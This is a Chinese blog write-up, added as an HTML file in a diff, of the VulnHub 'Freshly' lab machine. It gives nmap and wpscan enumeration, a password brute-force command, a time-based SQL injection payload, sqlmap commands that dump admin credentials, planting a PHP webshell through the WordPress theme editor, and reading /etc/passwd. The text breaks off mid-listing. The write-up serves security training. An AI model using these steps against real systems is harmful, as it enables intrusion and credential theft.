@@ -1,0 +1,860 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="tusk1'Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="目标The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file. If you can find the secret, send me an email for verification. :) There are a coup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub-Freshly Writeup">
+<meta property="og:url" content="http://yoursite.com/2019/04/19/VulnHub-Freshly-Writeup/index.html">
+<meta property="og:site_name" content="tusk1&#39;Blog">
+<meta property="og:description" content="目标The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file. If you can find the secret, send me an email for verification. :) There are a coup">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/VulnHub-Freshly-Writeup/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/VulnHub-Freshly-Writeup/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/VulnHub-Freshly-Writeup/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/VulnHub-Freshly-Writeup/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/VulnHub-Freshly-Writeup/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/VulnHub-Freshly-Writeup/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/VulnHub-Freshly-Writeup/6.png">
+<meta property="og:updated_time" content="2019-04-19T05:05:48.510Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="VulnHub-Freshly Writeup">
+<meta name="twitter:description" content="目标The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file. If you can find the secret, send me an email for verification. :) There are a coup">
+<meta name="twitter:image" content="http://yoursite.com/2019/04/19/VulnHub-Freshly-Writeup/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/04/19/VulnHub-Freshly-Writeup/">
+
+
+
+
+
+  <title>VulnHub-Freshly Writeup | tusk1'Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">tusk1'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/19/VulnHub-Freshly-Writeup/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="tusk1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tusk1'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">VulnHub-Freshly Writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-19T12:45:50+08:00">
+                2019-04-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file. If you can find the secret, send me an email for verification. :)</p>
+<p>There are a couple of different ways that you can go with this one. Good luck!</p>
+<p>Simply download and import the OVA file into virtualbox!</p>
+<p>VulnHub note: You may have issues when importing to VMware. If this is the case. extract the HDD from the OVA file (using something like 7zip), and attach to a new VM. Please see the following guide: <a href="https://jkad.github.io/blog/2015/04/12/how-to-import-the-top-hat-sec-vms-into-vmware/" target="_blank" rel="noopener">https://jkad.github.io/blog/2015/04/12/how-to-import-the-top-hat-sec-vms-into-vmware/</a>.</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>Quick scan</p>
+<blockquote>
+<blockquote>
+<p>nmap -T4 -F 192.168.1.104</p>
+</blockquote>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.1.104</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">Not shown: 97 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">443/tcp  open  https</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">MAC Address: 08:00:27:D4:BC:A6 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>
+<p>80端口有一张图片:<br><img src="/2019/04/19/VulnHub-Freshly-Writeup/1.png" alt=""></p>
+<p>在8080端口找到主站:<a href="http://192.168.1.104:8080/wordpress/" target="_blank" rel="noopener">http://192.168.1.104:8080/wordpress/</a><br><img src="/2019/04/19/VulnHub-Freshly-Writeup/2.png" alt=""><br>是wordpress系统</p>
+<h3 id="wpscan扫描"><a href="#wpscan扫描" class="headerlink" title="wpscan扫描"></a>wpscan扫描</h3><p>针对wordpress进行扫描：  </p>
+<blockquote>
+<blockquote>
+<p>wpscan –url <a href="http://192.168.1.104:8080/wordpress/" target="_blank" rel="noopener">http://192.168.1.104:8080/wordpress/</a></p>
+</blockquote>
+</blockquote>
+<p>结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">[+] WordPress version 4.1.26 identified (Latest, released on 2019-03-13).</span><br><span class="line">...</span><br><span class="line">[+] WordPress theme in use: twentythirteen</span><br><span class="line">...</span><br><span class="line">| Version: 1.4 (80% confidence)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] all-in-one-seo-pack</span><br><span class="line"> | Location: http://192.168.1.104:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/</span><br><span class="line"> | Last Updated: 2019-02-20T19:20:00.000Z</span><br><span class="line"> | [!] The version is out of date, the latest version is 2.12</span><br><span class="line"> |</span><br><span class="line"> | Detected By: Comment (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | [!] 5 vulnerabilities identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: All in One SEO Pack &lt;= 2.2.5.1 - Information Disclosure</span><br><span class="line"> |     Fixed in: 2.2.6</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpvulndb.com/vulnerabilities/7881</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0902</span><br><span class="line"> |      - http://jvn.jp/en/jp/JVN75615300/index.html</span><br><span class="line"> |      - http://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: All in One SEO Pack &lt;= 2.2.6.1 - Cross-Site Scripting (XSS)</span><br><span class="line"> |     Fixed in: 2.2.6.2</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpvulndb.com/vulnerabilities/7916</span><br><span class="line"> |      - https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: All in One SEO Pack &lt;= 2.3.6.1 - Unauthenticated Stored Cross-Site Scripting (XSS)</span><br><span class="line"> |     Fixed in: 2.3.7</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpvulndb.com/vulnerabilities/8538</span><br><span class="line"> |      - http://seclists.org/fulldisclosure/2016/Jul/23</span><br><span class="line"> |      - https://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/</span><br><span class="line"> |      - https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_in_all_in_one_seo_pack_wordpress_plugin.html</span><br><span class="line"> |      - https://wptavern.com/all-in-one-seo-2-3-7-patches-persistent-xss-vulnerability</span><br><span class="line"> |      - https://www.wordfence.com/blog/2016/07/xss-vulnerability-all-in-one-seo-pack-plugin/</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: All in One SEO Pack &lt;= 2.3.7 -  Unauthenticated Stored Cross-Site Scripting (XSS)</span><br><span class="line"> |     Fixed in: 2.3.8</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpvulndb.com/vulnerabilities/8558</span><br><span class="line"> |      - https://www.wordfence.com/blog/2016/07/new-xss-vulnerability-all-in-one-seo-pack/</span><br><span class="line"> |      - https://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: All in One SEO Pack &lt;= 2.9.1.1 - Authenticated Stored Cross-Site Scripting (XSS)</span><br><span class="line"> |     Fixed in: 2.10</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpvulndb.com/vulnerabilities/9159</span><br><span class="line"> |      - https://www.ripstech.com/php-security-calendar-2018/#day-4</span><br><span class="line"> |      - https://wordpress.org/support/topic/a-critical-vulnerability-has-been-detected-in-this-plugin/</span><br><span class="line"> |      - https://semperfiwebdesign.com/all-in-one-seo-pack-release-history/</span><br><span class="line"> |</span><br><span class="line"> | Version: 2.2.5.1 (60% confidence)</span><br><span class="line"> | Detected By: Comment (Passive Detection)</span><br><span class="line"> |  - http://192.168.1.104:8080/wordpress/, Match: &apos;All in One SEO Pack 2.2.5.1 by&apos;</span><br><span class="line"></span><br><span class="line">[+] cart66-lite</span><br><span class="line"> | Location: http://192.168.1.104:8080/wordpress/wp-content/plugins/cart66-lite/</span><br><span class="line"> | Last Updated: 2016-01-27T21:11:00.000Z</span><br><span class="line"> | [!] The version is out of date, the latest version is 1.5.8</span><br><span class="line"> |</span><br><span class="line"> | Detected By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | [!] 2 vulnerabilities identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: Cart66 Lite &lt;= 1.5.3 - SQL Injection</span><br><span class="line"> |     Fixed in: 1.5.4</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpvulndb.com/vulnerabilities/7737</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9442</span><br><span class="line"> |      - https://research.g0blin.co.uk/cve-2014-9442/</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: Cart66 Lite 1.5.4 - XSS</span><br><span class="line"> |     Fixed in: 1.5.5</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpvulndb.com/vulnerabilities/8014</span><br><span class="line"> |      - http://packetstormsecurity.com/files/130307/</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.5.3 (100% confidence)</span><br><span class="line"> | Detected By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.1.104:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.1.104:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt</span><br><span class="line"></span><br><span class="line">[+] contact-form-7</span><br><span class="line"> | Location: http://192.168.1.104:8080/wordpress/wp-content/plugins/contact-form-7/</span><br><span class="line"> | Last Updated: 2018-12-18T18:05:00.000Z</span><br><span class="line"> | [!] The version is out of date, the latest version is 5.1.1</span><br><span class="line"> |</span><br><span class="line"> | Detected By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | [!] 1 vulnerability identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: Contact Form 7 &lt;= 5.0.3 - register_post_type() Privilege Escalation</span><br><span class="line"> |     Fixed in: 5.0.4</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpvulndb.com/vulnerabilities/9127</span><br><span class="line"> |      - https://contactform7.com/2018/09/04/contact-form-7-504/</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1935726/contact-form-7</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1934594/contact-form-7</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1934343/contact-form-7</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1934327/contact-form-7</span><br><span class="line"> |      - https://www.ripstech.com/php-security-calendar-2018/#day-18</span><br><span class="line"> |</span><br><span class="line"> | Version: 4.1 (100% confidence)</span><br><span class="line"> | Detected By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.1.104:8080/wordpress/wp-content/plugins/contact-form-7/readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.1.104:8080/wordpress/wp-content/plugins/contact-form-7/readme.txt</span><br><span class="line"></span><br><span class="line">[+] proplayer</span><br><span class="line"> | Location: http://192.168.1.104:8080/wordpress/wp-content/plugins/proplayer/</span><br><span class="line"> |</span><br><span class="line"> | Detected By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | [!] 1 vulnerability identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: ProPlayer 4.7.9.1 - SQL Injection</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpvulndb.com/vulnerabilities/6912</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/25605/</span><br><span class="line"> |</span><br><span class="line"> | Version: 4.7.9.1 (80% confidence)</span><br><span class="line"> | Detected By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.1.104:8080/wordpress/wp-content/plugins/proplayer/readme.txt</span><br></pre></td></tr></table></figure></p>
+<p>对以上存在sql注入漏洞的插件进行了测试,但都没有成功  </p>
+<p>扫描用户名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.1.104:8080/wordpress/ --enumerate u</span><br></pre></td></tr></table></figure></p>
+<p>结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Detected By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Aggressive Detection)</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure></p>
+<p>扫描密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.1.104:8080/wordpress --usernames admin --password-attack wp-login -P word1000.txt</span><br></pre></td></tr></table></figure></p>
+<p>没有得到密码</p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>御剑扫描<a href="http://192.168.1.104/发现phpmyadmin,login.php" target="_blank" rel="noopener">http://192.168.1.104/发现phpmyadmin,login.php</a><br><img src="/2019/04/19/VulnHub-Freshly-Writeup/3.png" alt=""><br>phpmyadmin无法登陆</p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>对login.php<br><img src="/2019/04/19/VulnHub-Freshly-Writeup/7.png" alt=""><br>输入admin’ or sleep(10)# ,页面回显明显停顿<br>存在注入,使用sqlmap：</p>
+<blockquote>
+<blockquote>
+<p>sqlmap.py -u “<a href="http://192.168.1.104/login.php&quot;" target="_blank" rel="noopener">http://192.168.1.104/login.php&quot;</a> –forms</p>
+</blockquote>
+</blockquote>
+<p>未找到注入点，调高等级：</p>
+<blockquote>
+<blockquote>
+<p>sqlmap.py -u “<a href="http://192.168.1.104/login.php&quot;" target="_blank" rel="noopener">http://192.168.1.104/login.php&quot;</a> –forms –level=5 –risk=3</p>
+</blockquote>
+</blockquote>
+<p>成功发现注入点:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of 6020 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: user (POST)</span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span><br><span class="line">    Payload: user=admin&apos;||(SELECT &apos;CIgz&apos; FROM DUAL WHERE 2964=2964 AND SLEEP(5))||&apos;&amp;password=uUbb&amp;s=Submit</span><br><span class="line">---</span><br><span class="line">do you want to exploit this SQL injection? [Y/n] y</span><br><span class="line">[23:21:08] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu</span><br><span class="line">web application technology: Apache 2.4.7, PHP 5.5.9</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br></pre></td></tr></table></figure></p>
+<p>依次使用命令：  </p>
+<blockquote>
+<blockquote>
+<p>sqlmap.py -u “<a href="http://192.168.1.104/login.php&quot;" target="_blank" rel="noopener">http://192.168.1.104/login.php&quot;</a> –forms –dbs</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>sqlmap.py -u “<a href="http://192.168.1.104/login.php&quot;" target="_blank" rel="noopener">http://192.168.1.104/login.php&quot;</a> –forms –tables -D “wordpress8080”</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>sqlmap.py -u “<a href="http://192.168.1.104/login.php&quot;" target="_blank" rel="noopener">http://192.168.1.104/login.php&quot;</a> –forms –tables -D “wordpress8080”</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>sqlmap.py -u “<a href="http://192.168.1.104/login.php&quot;" target="_blank" rel="noopener">http://192.168.1.104/login.php&quot;</a> –forms –columns -T “users”  -D “wordpress8080”</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>sqlmap.py -u “<a href="http://192.168.1.104/login.php&quot;" target="_blank" rel="noopener">http://192.168.1.104/login.php&quot;</a> –forms –dump -C “username,password” -T “users”  -D “wordpress8080”</p>
+</blockquote>
+</blockquote>
+<p>获得wordpress的账号密码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Table: users</span><br><span class="line">[1 entry]</span><br><span class="line">+----------+---------------------+</span><br><span class="line">| username | password            |</span><br><span class="line">+----------+---------------------+</span><br><span class="line">| admin    | SuperSecretPassword |</span><br><span class="line">+----------+---------------------+</span><br></pre></td></tr></table></figure></p>
+<h3 id="wordpress后台getshell"><a href="#wordpress后台getshell" class="headerlink" title="wordpress后台getshell"></a>wordpress后台getshell</h3><p>登陆wordpress的后台后,外观-编辑模板，随便找一个php文件写入一句话木马,然后菜刀连接：<br><img src="/2019/04/19/VulnHub-Freshly-Writeup/4.png" alt=""><br><img src="/2019/04/19/VulnHub-Freshly-Writeup/5.png" alt=""><br>菜刀上打开虚拟终端:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[/etc/]$ id</span><br><span class="line">uid=1(daemon) gid=1(daemon) groups=1(daemon)</span><br></pre></td></tr></table></figure></p>
+<p>当前非root用户<br>查看/etc/passwd文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span 